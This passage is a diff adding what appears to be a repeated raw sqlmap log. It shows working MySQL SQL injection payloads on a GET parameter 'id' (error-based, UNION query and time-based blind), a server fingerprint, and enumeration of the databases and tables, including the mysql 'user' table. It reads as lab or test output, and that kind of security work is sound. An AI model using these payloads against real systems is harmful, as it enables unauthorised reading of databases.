+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: mysql
+[24 tables]
++---------------------------+
+| user                      |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
++---------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+Database: performance_schema
+[17 tables]
++----------------------------------------------+
+| cond_instances                               |
+| events_waits_current                         |
+| events_waits_history                         |
+| events_waits_history_long                    |
+| events_waits_summary_by_instance             |
+| events_waits_summary_by_thread_by_event_name |
+| events_waits_summary_global_by_event_name    |
+| file_instances                               |
+| file_summary_by_event_name                   |
+| file_summary_by_instance                     |
+| mutex_instances                              |
+| performance_timers                           |
+| rwlock_instances                             |
+| setup_consumers                              |
+| setup_instruments                            |
